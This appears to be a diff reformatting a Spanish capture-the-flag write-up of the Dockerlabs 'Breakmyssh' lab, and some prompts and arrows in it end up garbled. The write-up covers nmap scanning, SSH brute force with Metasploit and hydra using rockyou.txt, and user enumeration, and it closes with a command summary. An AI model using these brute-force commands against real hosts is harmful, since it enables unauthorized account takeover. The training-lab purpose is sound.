@@ -16,14 +16,14 @@ tags:
 # Datos
 
 [!INFO] Breakmyssh
->  **Nombre:** Breakmyssh
->  **SO:** Linux
->  **Dificultad:** Muy fácil
->  **Enlace:** [Dockerlabs](https://dockerlabs.es/)
+  -  **Nombre:** Breakmyssh
+  -  **SO:** Linux
+  -  **Dificultad:** Muy fácil
+  -  **Enlace:** [Dockerlabs](https://dockerlabs.es/)
 
 [!TODO] Objetivo
-> 🚩Ingresar a la maquina como algún usuario.
-> 🚩Elevar privilegios una vez obtenido el acceso.
+  - 🚩Ingresar a la maquina como algún usuario.
+  - 🚩Elevar privilegios una vez obtenido el acceso.
 
 El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:
 
@@ -33,7 +33,7 @@ El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como eje
 
 # Reconocimiento
 
-> Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:
+  - Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:
 
 ```bash
 └─# nmap 172.17.0.2
@@ -52,12 +52,12 @@ Esta maquina se pone un poco más interesante pues solo tenemos el puerto `SSH` 
 
 # Fuerza bruta con metasploit
 
-> Ya que no tengo usuarios, procedo a descargar el siguiente diccionario de usuarios [GitHub - hackingyseguridad/diccionarios](https://github.com/hackingyseguridad/diccionarios) y adicional le pasare `rockyou.txt` para la contraseña.
+  - Ya que no tengo usuarios, procedo a descargar el siguiente diccionario de usuarios [GitHub - hackingyseguridad/diccionarios](https://github.com/hackingyseguridad/diccionarios) y adicional le pasare `rockyou.txt` para la contraseña.
 
 Utilizo `ssh_login` con metasploit de la siguiente manera:
 
 ```bash
-msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6   - use auxiliary/scanner/ssh/ssh_login
 ```
 
 Para el diccionario de usuario, utilizo el descargado desde github.
@@ -81,11 +81,11 @@ SET RHOSTS 172.17.0.2
 Y luego hago un `run` o `exploit` para ejecutarlo y al cabo de un rato me encuentra las credenciales de root.
 
 ```bash
-msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+msf6 auxiliary(scanner/ssh/ssh_login)   - exploit
 
 [*] 172.17.0.2:22 - Starting bruteforce
 [+] 172.17.0.2:22 - Success: 'root:xxxxxxxx' 'uid=0(root) gid=0(root) groups=0(root) Linux 4d678d7eed61 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-05-17) x86_64 GNU/Linux '
-[*] SSH session 1 opened (172.17.0.1:43721 -> 172.17.0.2:22) at 2024-05-22 21:51:25 -0400
+[*] SSH session 1 opened (172.17.0.1:43721 -  - 172.17.0.2:22) at 2024-05-22 21:51:25 -0400
 ```
 
 Y bueno ya con esto se puede decir que la maquina esta completa, sin embargo estando como root, chequeo para ver si existe algún usuario en el sistema, así que voy a directorio `/home` y resulta que existe el usuario: `lovely`
@@ -94,7 +94,7 @@ Y bueno ya con esto se puede decir que la maquina esta completa, sin embargo est
 
 # Fuerza bruta SSH
 
-> Ahora que se que existe el usuario `lovely` en el sistema, procedo a realizar un ataque de fuerza bruta usando `hydra` como en las otras maquinas, de la siguiente manera:
+  - Ahora que se que existe el usuario `lovely` en el sistema, procedo a realizar un ataque de fuerza bruta usando `hydra` como en las otras maquinas, de la siguiente manera:
 
 ```bash
 └─# hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
@@ -119,7 +119,7 @@ SET USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-userna
 Y el resultado fue el siguiente:
 
 ```bash
-msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit
+msf6 auxiliary(scanner/ssh/ssh_enumusers)   - exploit
 
 [*] 172.17.0.2:22 - SSH - Using malformed packet technique
 [*] 172.17.0.2:22 - SSH - Checking for false positives
@@ -144,16 +144,16 @@ Y el resultado confirma mi sospecha, lo primero era enumerar usuarios, el result
 # Comandos
 
 [!IMPORTANT] Resumen de comandos utilizados
-> `sudo bash auto_deploy.sh vacaciones.tar`
-> `nmap 172.17.0.2`
-> `msfconsole`
-> `use auxiliary/scanner/ssh/ssh_login`
-> `SET USER_FILE /usr/share/wordlists/users.txt`
-> `SET PASS_FILE /usr/share/wordlists/users.txt`
-> `SET RHOSTS 172.17.0.2`
-> `hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh`
-> `use auxiliary/scanner/ssh/ssh_enumusers`
-> `SET USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`
+  - `sudo bash auto_deploy.sh vacaciones.tar`
+  - `nmap 172.17.0.2`
+  - `msfconsole`
+  - `use auxiliary/scanner/ssh/ssh_login`
+  - `SET USER_FILE /usr/share/wordlists/users.txt`
+  - `SET PASS_FILE /usr/share/wordlists/users.txt`
+  - `SET RHOSTS 172.17.0.2`
+  - `hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh`
+  - `use auxiliary/scanner/ssh/ssh_enumusers`
+  - `SET USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`
 
 
 
